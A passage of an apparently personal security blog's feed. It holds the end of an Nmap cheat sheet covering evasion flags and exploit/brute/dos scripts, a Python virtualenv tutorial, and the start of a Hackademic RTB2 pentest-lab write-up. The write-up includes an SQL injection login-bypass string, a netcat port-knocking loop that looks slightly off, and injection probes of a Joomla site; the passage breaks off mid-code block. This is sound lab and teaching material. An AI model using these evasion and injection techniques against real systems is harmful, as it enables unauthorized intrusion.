<p><strong>&mdash;badsum</strong>: Send packets with a bogus TCP/UDP/SCTP checksum. Normal hosts discard packets with bad checksums, but firewalls may omit these checks for performance reasons</p>

<p><strong>&mdash;dns-servers &lt;serv1[,serv2],&hellip;></strong>: Specify custom DNS servers when doing reverse DNS lookup to avoid your DNS server showing up in the target&rsquo;s logs</p>

<h3>Additional info</h3>

<p><strong>-v</strong>: increase verbosity level, you can use it 2 or 3 times to further increase verbosity</p>

<p><strong>-d</strong>: Increase debugging level (use -dd or more for greater effect), can increase to a max of 9</p>

<p><strong>&mdash;packet-trace</strong>: print summary of every packet sent and received</p>

<h3>Output</h3>

<p><strong>-oN/-oX/-oS/-oG <file></strong>: Output scan in normal, XML, sCrIpt kIddi3, and Grepable format, respectively, to the given filename</p>

<p><strong>-oA <basename></strong>: Output in the three major formats at once</p>

<p><strong>&mdash;resume <filename></strong>: Resume an aborted scan</p>

<p>If you don&rsquo;t want Nmap to display its interactive output, you can pass a <em>&ndash;</em> to the format type(s), like so: <code>-oS &ndash;</code></p>

<h2>Useful tips</h2>

<ul>
<li><p><code>nmap -sL -n target</code> &ndash; list IPs to be scanned before actually scanning them</p></li>
<li><p><code>-pT:22,80,U:53</code> &ndash; scan separate TCP and UDP ports (you have to specify a UDP scan in addition to a TCP scan)</p></li>
<li><p><code>&mdash;version-intensity <level></code>: Set from 0 (light) to 9 (try all probes), setting it to 0 will limit the version detection to the most likely to succeed probes, and improve the speed of the scan</p></li>
<li><p>you can scan a network range by adding the subnet mask after an IP like so: <em>ip/numbits</em>. An example would be: 192.168.80.0/24, where the hosts between 192.168.80.0 and 192.168.80.255 would be scanned</p></li>
<li><p>version detection is noisy</p></li>
<li><p>you can specify port 0 for a scan, to catch malicious software that might listen on it</p></li>
</ul>


<h2>Script scanning</h2>

<p><strong>-sC</strong>: enable some common scripts, may be intrusive to the target</p>

<p><strong>&mdash;script</strong>=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories</p>

<p><a href="https://nmap.org/book/nse-usage.html">Currently defined categories</a> are:</p>

<ul>
<li><p><em>auth</em> &ndash; operations requiring authentication credentials</p></li>
<li><p><em>broadcast</em> &ndash; local network broadcasts</p></li>
<li><p><em>brute</em> &ndash; brute force attacks</p></li>
<li><p><em>default</em> &ndash; scripts that are run by default with -sC or -A options</p></li>
<li><p><em>discovery</em> &ndash; additional network information and enumeration</p></li>
<li><p><em>dos</em> &ndash; denial of service scripts</p></li>
<li><p><em>exploit</em> &ndash; exploitation of some specific vulnerability</p></li>
<li><p><em>external</em> &ndash; information may be sent to a third-party database or service</p></li>
<li><p><em>fuzzer</em> &ndash; fuzzing scripts</p></li>
<li><p><em>intrusive</em> &ndash; may crash the target system, consume excessive resources, or be perceived as malicious</p></li>
<li><p><em>malware</em> &ndash; test if the target is infected by malware or backdoors</p></li>
<li><p><em>safe</em> &ndash; general network discovery scripts that re unlikely to be resource intensive, crash a system, or lit the target logs on fire</p></li>
<li><p><em>version</em> &ndash; scripts that run only with -sV enabled</p></li>
<li><p><em>vuln</em> &ndash; check for specific vulnerabilities</p></li>
</ul>


<p>A full list of scripts and their description and usage can be found at <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p>

<p>Some notable scripts that you might use more often are listed below.</p>

<ul>
<li><p>dns-zone-transfer &ndash; requests a zone transfer from a DNS server</p></li>
<li><p>ftp-anon &ndash; checks if anonymous login is enabled on an FTP server and lists the root directory if yes</p></li>
<li><p>ftp-bounce &ndash; checks if FTP server allows port scanning via the bounce method</p></li>
<li><p>http-auth-finder &ndash; spiders a site to find pages containing form or HTTP authentication</p></li>
<li><p>http-backup-finder &ndash; spiders a site to find backups of discovered files</p></li>
<li><p>http-config-backup &ndash; searches for backups of web server and CMS configuration files</p></li>
<li><p>http-csrf &ndash; checks for forms vulnerable to CSRF</p></li>
<li><p>http-default-accounts &ndash; checks for default credentials in web applications, routers, and VOIP and security devices</p></li>
<li><p>http-devframework &ndash; checks for the underlying framework of a site</p></li>
<li><p>http-dlink-backdoor &ndash; checks for a firmware backdoor that is found in some D-Link routers</p></li>
<li><p>http-dombased-xss &ndash; searches for places susceptible to DOM-based XSS</p></li>
<li><p>http-drupal-enum-users &ndash; enumerates Drupal users</p></li>
<li><p>http-enum &ndash; enumerates common directories found in web apps</p></li>
<li><p>http-fileupload-exploiter &ndash; exploits file upload vulnerabilities</p></li>
<li><p>http-mobileversion-checker &ndash; checks if the site has a mobile version</p></li>
<li><p>http-open-redirect &ndash; checks for open redirects</p></li>
<li><p>http-passwd &ndash; checks for directory traversal</p></li>
<li><p>http-phpself-xss &ndash; finds PHP_SELF XSS vulnerabilities</p></li>
<li><p>http-rfi-spider &ndash; searches for RFI in forms and URL parameters</p></li>
<li><p>http-shellshock &ndash; checks if web app is vulnerable to shellshock</p></li>
<li><p>http-sitemap-generator &ndash; crawls a site and lists its directory structure and files</p></li>
<li><p>http-sql-injection &ndash; looks for SQLi in forms and URL parameters of HTTP servers</p></li>
<li><p>http-stored-xss &ndash; searches for unfiltered input that might lead to XSS</p></li>
<li><p>http-tplink-dir-traversal &ndash; on certain TPLINK routers that are vulnerable to directory traversal, it can read remote files with no authentication required</p></li>
<li><p>http-unsafe-output-escaping &ndash; crawls a site looking for where improperly escaped data is reflected back to the user</p></li>
<li><p>http-vuln-cve2012-1823 &ndash; attempts to exploit vulnerable PHP CGI apps that allow remote code execution</p></li>
<li><p>http-vuln-cve2015-1635 &ndash; checks for the MS15-034 RCE vulnerability in Windows machines</p></li>
<li><p>http-waf-detect &ndash; tries to detect IDS / IPS / WAF protection on the target</p></li>
<li><p>http-waf-fingerprint &ndash; attempts to fingerpring the WAF</p></li>
<li><p>http-webdav-scan &ndash; WebDAV detection</p></li>
<li><p>ipidseq &ndash; tests for suitable zombies to be used in idle scan</p></li>
<li><p>mongodb-databases &ndash; enumerates MongoDB tables</p></li>
<li><p>ms-sql-empty-password &ndash; tries to login as the sa account with no password on MS-SQL</p></li>
<li><p>mysql-empty-password &ndash; checks for MySQL servers with empty password for the root or anonymous account</p></li>
<li><p>samba-vuln-cve-2012-1182 &ndash; checks if Samba server is vulnerable to CVE-2012-1182 heap overflow</p></li>
<li><p>shodan-api &ndash; uses Shodan (API key needed) to scan targets in a way similar to the -sV scan</p></li>
<li><p>sniffer-detect &ndash; checks if a NIC on the local network is in promiscuous mode</p></li>
<li><p>ssl-heartbleed &ndash; checks for the Heartbleed vulnerability</p></li>
<li><p>ssl-poodle &ndash; checks for the Poodle vulnerability</p></li>
<li><p>tor-consensus-checker &ndash; checks if target host is a Tor node</p></li>
<li><p>traceroute-geolocation &ndash; performs geolocation on traceroute hops</p></li>
</ul>


<p>Many thanks to Fyodor for creating such an awesome tool and freely sharing with everyone! As you can see, Nmap is so much more than just a port scanner. You can easily perform some sort of vulnerability analysis and exploitation with it, and if there is no task that you would like Nmap to do and it can&rsquo;t, you can write the code yourself and contribute to this amazing project.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ You have the capacity to learn from \
</span><span class='line'>\ mistakes. You'll learn a lot today. /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python virtualenv]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/29/python-virtualenv/"/>
    <updated>2016-07-29T17:55:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/29/python-virtualenv</id>
    <content type="html"><![CDATA[<p>In this post I am going to introduce Python&rsquo;s virtual environments, through the <strong>virtualenv</strong> tool. With this tool, you can keep separate environments for your projects, with their own dependencies and executables. By isolating the project environments, you can keep them neat and organized, without messing up your global installation. Depending on the requirements of what you&rsquo;re working on, you can use different versions of Python or keep older libraries on a per-project basis. Nothing outside the virtual environment will be modified.</p>

<!-- more -->


<h1>Installation</h1>

<p>To begin with, install <em>virtualenv</em>. You can do it in several ways. Via pip: <code>pip install virtualenv</code>, or with easy_install: <code>easy_install virtualenv</code>. Now let&rsquo;s look at the help menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# virtualenv -h
</span><span class='line'>Usage: virtualenv [OPTIONS] DEST_DIR
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  --version             show program's version number and exit
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -v, --verbose         Increase verbosity.
</span><span class='line'>  -q, --quiet           Decrease verbosity.
</span><span class='line'>  -p PYTHON_EXE, --python=PYTHON_EXE
</span><span class='line'>                        The Python interpreter to use, e.g.,
</span><span class='line'>                        --python=python2.5 will use the python2.5 interpreter
</span><span class='line'>                        to create the new environment.  The default is the
</span><span class='line'>                        interpreter that virtualenv was installed with
</span><span class='line'>                        (/usr/bin/python)
</span><span class='line'>  --clear               Clear out the non-root install and start from scratch.
</span><span class='line'>  --no-site-packages    DEPRECATED. Retained only for backward compatibility.
</span><span class='line'>                        Not having access to global site-packages is now the
</span><span class='line'>                        default behavior.
</span><span class='line'>  --system-site-packages
</span><span class='line'>                        Give the virtual environment access to the global
</span><span class='line'>                        site-packages.
</span><span class='line'>  --always-copy         Always copy files rather than symlinking.
</span><span class='line'>  --unzip-setuptools    Unzip Setuptools when installing it.
</span><span class='line'>  --relocatable         Make an EXISTING virtualenv environment relocatable.
</span><span class='line'>                        This fixes up scripts and makes all .pth files
</span><span class='line'>                        relative.
</span><span class='line'>  --no-setuptools       Do not install setuptools in the new virtualenv.
</span><span class='line'>  --no-pip              Do not install pip in the new virtualenv.
</span><span class='line'>  --no-wheel            Do not install wheel in the new virtualenv.
</span><span class='line'>  --extra-search-dir=DIR
</span><span class='line'>                        Directory to look for setuptools/pip distributions in.
</span><span class='line'>                        This option can be used multiple times.
</span><span class='line'>  --download            Download preinstalled packages from PyPI.
</span><span class='line'>  --no-download, --never-download
</span><span class='line'>                        Do not download preinstalled packages from PyPI.
</span><span class='line'>  --prompt=PROMPT       Provides an alternative prompt prefix for this
</span><span class='line'>                        environment.
</span><span class='line'>  --setuptools          DEPRECATED. Retained only for backward compatibility.
</span><span class='line'>                        This option has no effect.
</span><span class='line'>  --distribute          DEPRECATED. Retained only for backward compatibility.
</span><span class='line'>                        This option has no effect.</span></code></pre></td></tr></table></div></figure>


<h1>Usage</h1>

<p>So you&rsquo;re about to begin a new project. You want to start from scratch and keep it contained to itself. Creating a virtual environment will help you accomplish that:</p>

<p><code>virtualenv my_project</code></p>

<p>Now you can go to the newly created directory and see that there are already some folders inside. <code>bin</code> has the executables, <code>include</code> holds the header files, and <code>lib</code> contains the files of the installed modules in the virtual environment.</p>

<p>Before you begin to work with your new environment, you need to activate it with <code>source bin/activate</code> or <code>source env_name/bin/activate</code> if you are outside the environment&rsquo;s directory.</p>

<p>You will now see your propmt change, to confirm that the environment is active. For me, it looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(my_project) root@kali:~/projects/my_project#</span></code></pre></td></tr></table></div></figure>


<p>Now you can begin your work, installing packages, etc. When you&rsquo;re done, you can type <code>deactivate</code> to exit your environment. If you want to delete it, just remove its directory.</p>

<p>When working with virtual environments, it might be helpful to take a snapshot of your installed packages and their versions, in case you want to recreate the environment later. You can do this with <code>pip freeze > requirements.txt</code>. Check the newly created file for a list of your snapshotted items. In my case, I only installed requests in my environment so far:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat requirements.txt 
</span><span class='line'>requests==2.10.0</span></code></pre></td></tr></table></div></figure>


<p>If you need the exact same environment later, maybe to let some one of your team to work on the project, you can install the same packages and versions with the command <code>pip install -r requirements.txt</code></p>

<h2>virtualenvwrapper</h2>

<p>To make working with virtual environments even more convenient, you can use <em>virtualenvwrapper</em>, which provides wrappers for managing your environments and helps keep all your environments in one place. It also allows you to switch between environments with only one command, and has tab completion.</p>

<p>First, install it (outside your environments), with <code>pip install virtualenvwrapper</code>.</p>

<p>Then you need to add a few lines to your shell startup script. In my <code>~/.bashrc</code> file, I added the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># set the location where your virtual environments will be stored
</span><span class='line'>export WORKON_HOME=$HOME/.virtualenvs
</span><span class='line'># set the location of the virtualenvwrapper script (where it was installed)
</span><span class='line'>source /usr/local/bin/virtualenvwrapper.sh</span></code></pre></td></tr></table></div></figure>


<p>Now reload the startup file: <code>source ~/.bashrc</code> and you will see that your .virtualenvs folder has been created and populated with some scripts. Let&rsquo;s look at the help menu to see the available commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virtualenvwrapper
</span><span class='line'>
</span><span class='line'>virtualenvwrapper is a set of extensions to Ian Bicking's virtualenv
</span><span class='line'>tool.  The extensions include wrappers for creating and deleting
</span><span class='line'>virtual environments and otherwise managing your development workflow,
</span><span class='line'>making it easier to work on more than one project at a time without
</span><span class='line'>introducing conflicts in their dependencies.
</span><span class='line'>
</span><span class='line'>For more information please refer to the documentation:
</span><span class='line'>
</span><span class='line'>    http://virtualenvwrapper.readthedocs.org/en/latest/command_ref.html
</span><span class='line'>
</span><span class='line'>Commands available:
</span><span class='line'>
</span><span class='line'>  add2virtualenv: add directory to the import path
</span><span class='line'>
</span><span class='line'>  allvirtualenv: run a command in all virtualenvs
</span><span class='line'>
</span><span class='line'>  cdproject: change directory to the active project
</span><span class='line'>
</span><span class='line'>  cdsitepackages: change to the site-packages directory
</span><span class='line'>
</span><span class='line'>  cdvirtualenv: change to the $VIRTUAL_ENV directory
</span><span class='line'>
</span><span class='line'>  cpvirtualenv: duplicate the named virtualenv to make a new one
</span><span class='line'>
</span><span class='line'>  lssitepackages: list contents of the site-packages directory
</span><span class='line'>
</span><span class='line'>  lsvirtualenv: list virtualenvs
</span><span class='line'>
</span><span class='line'>  mkproject: create a new project directory and its associated virtualenv
</span><span class='line'>
</span><span class='line'>  mktmpenv: create a temporary virtualenv
</span><span class='line'>
</span><span class='line'>  mkvirtualenv: Create a new virtualenv in $WORKON_HOME
</span><span class='line'>
</span><span class='line'>  rmvirtualenv: Remove a virtualenv
</span><span class='line'>
</span><span class='line'>  setvirtualenvproject: associate a project directory with a virtualenv
</span><span class='line'>
</span><span class='line'>  showvirtualenv: show details of a single virtualenv
</span><span class='line'>
</span><span class='line'>  toggleglobalsitepackages: turn access to global site-packages on/off
</span><span class='line'>
</span><span class='line'>  virtualenvwrapper: show this help message
</span><span class='line'>
</span><span class='line'>  wipeenv: remove all packages installed in the current virtualenv
</span><span class='line'>
</span><span class='line'>  workon: list or change working virtualenvs</span></code></pre></td></tr></table></div></figure>


<p>Ok, let&rsquo;s create a new environment: <code>mkvirtualenv beta_proj</code>. You can list all your environments with <code>lsvirtualenv</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsvirtualenv
</span><span class='line'>beta_proj
</span><span class='line'>=========</span></code></pre></td></tr></table></div></figure>


<p>Use the <code>workon</code> command to begin..working on your new environment: <code>workon beta_proj</code>. When finished, you can use <code>deactivate</code> again,or you can switch between multiple environments with <code>workon</code>.</p>

<p>Removing an environment can be done with the <code>rmvirtualenv</code> command</p>

<p>That&rsquo;s about all the basic tips needed to quick start your use of virtual environments in your Python projects. For more information, you can check the <a href="https://virtualenv.pypa.io/en/stable/">virtualenv</a> and <a href="https://virtualenvwrapper.readthedocs.io/en/latest/index.html">virtualenvwrapper</a> documentation.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Do what comes naturally. Seethe and \
</span><span class='line'>\ fume and throw a tantrum.           /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
    <updated>2016-07-20T13:36:20-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>

<!-- more -->


<h1>Recon</h1>

<p>Again, this will be a web hacking mission, only web server is available.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb2-web.png" title="hackademic" alt="hackademic website"></p>

<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -F -n -T4 192.168.80.166
</span><span class='line'>PORT     STATE SERVICE  REASON
</span><span class='line'>5353/udp open  zeroconf udp-response ttl 255</span></code></pre></td></tr></table></div></figure>


<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap  -p- 192.168.80.166
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-07-21 08:14 EDT
</span><span class='line'>Nmap scan report for 192.168.80.166
</span><span class='line'>Host is up, received arp-response (0.00024s latency).
</span><span class='line'>Not shown: 65533 closed ports, 1 filtered port
</span><span class='line'>Reason: 65533 resets and 1 port-unreach
</span><span class='line'>PORT   STATE SERVICE REASON
</span><span class='line'>80/tcp open  http    syn-ack ttl 64</span></code></pre></td></tr></table></div></figure>


<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE SERVICE REASON
</span><span class='line'>80/tcp  open  http    syn-ack ttl 64
</span><span class='line'>666/tcp open  doom    syn-ack ttl 64</span></code></pre></td></tr></table></div></figure>


<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))</span></code></pre></td></tr></table></div></figure>


<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='linespan></code></pre></td></tr></table></div></figure>


<p>Decoding it yielded a hex string this time:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0ad 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e</span></code></pre></td></tr></table></div></figure>


<p>After decoding the hex string, I got this message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;---------&gt;
</span><span class='line'>Knock Knock Knockin' on heaven's door .. :)
</span><span class='line'>00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
</span><span class='line'>&lt;---------&gt;</span></code></pre></td></tr></table></div></figure>


<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
</span><span class='line'>for i in 1001 1101 1011 1001
</span><span class='line'>do
</span><span class='line'>nc 192.168.80.167 80 $i
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>


<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb2-hidden.png" title="hidden web server" alt="hidden web server"></p>

<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities 
</span><span class='line'>Versions effected: Joomla! 1.5.12 
</span><span class='line'>Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
</span><span class='line'>Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
</span><span class='line'>Vulnerable? Yes</span></code></pre></td></tr></table></div></figure>


<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /administrator/
</span><span class='line'>Disallow: /cache/
</span><span class='line'>Disallow: /components/
</span><span class='line'>Disallow: /images/
</span><span class='line'>Disallow: /includes/
</span><span class='line'>Disallow: /installation/
</span><span class='line'>Disallow: /language/
</span><span class='line'>Disallow: /libraries/
</span><span class='line'>Disallow: /media/
</span><span class='line'>Disallow: /modules/
</span><span class='line'>Disallow: /plugins/
</span><span class='line'>Disallow: /templates/
</span><span class='line'>Disallow: /tmp/
</span><span class='line'>Disallow: /xmlrpc/</span></code></pre></td></tr></table></div></figure>


<h1>Exploit</h1>

<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.166:666/index.php?option=com_abc&view=abc&letter=%27&Itemid=3
</span><span class='line'>
</span><span class='line'>
